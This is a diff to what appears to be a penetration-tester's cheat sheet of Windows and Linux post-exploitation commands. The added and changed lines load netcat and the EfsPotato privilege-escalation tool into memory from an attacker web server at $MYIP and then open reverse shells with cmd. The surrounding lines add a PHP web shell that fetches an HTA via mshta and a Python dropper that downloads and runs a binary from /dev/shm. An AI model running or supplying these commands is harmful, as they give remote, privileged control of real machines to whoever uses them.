@@ -872,6 +872,10 @@ certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPo
 
 +---------- In Memory ----------+
 powershell -c "IEX(New-Object Net.WebClient).DownloadString(http://$MYIP:8888/windows/0.ps1)"
+powershell -c "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://$MYIP:8888/windows/nc.exe')"
+powershell -c "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://$MYIP:8888/windows/EfsPotato.exe')"
+powershell -c "[EfsPotato]::Main(@('C:\programdata\nc.exe','$MYIP','5555','-e','cmd'))"
+
 
 [*] Shells
 +---------- Get Architecture (x86 / x64) ----------+
@@ -924,10 +928,10 @@ echo 'type C:\Users\Administrator\Desktop\root.txt > C:\Windows\win.log' > C:\Wi
 Start-ScheduledTask -TaskName "Ownership"
 
 +---------- Reverse Shells ----------+
-C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd.exe
-C:\programdata\tmp\EfsPotato.exe "C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd"
-C:\programdata\tmp\FullPowers.exe -z -c "C:\programdata\tmp\EfsPotato.exe \"C:\programdata\tmp\nc.exe $MYIP 5555 -e cmd\""
-C:\programdata\tmp\SigmaPotato.exe --revshell $MYIP 5555
+C:\programdata\nc.exe $MYIP 5555 -e cmd.exe
+C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5555 -e cmd"
+C:\programdata\FullPowers.exe -z -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 5555 -e cmd\""
+C:\programdata\SigmaPotato.exe --revshell $MYIP 5555
 echo '<?php system('mshta http://$MYIP:8080/7qvnY13vrce.hta');?>' > shell.php
 echo -e 'import os\nos.popen("wget -qO /dev/shm/iZGYpy3w --no-check-certificate http://$MYIP:8080/11jUSgyiO5We7; chmod 777 /dev/shm/iZGYpy3w; /dev/shm/iZGYpy3w& disown")' > test.py
 
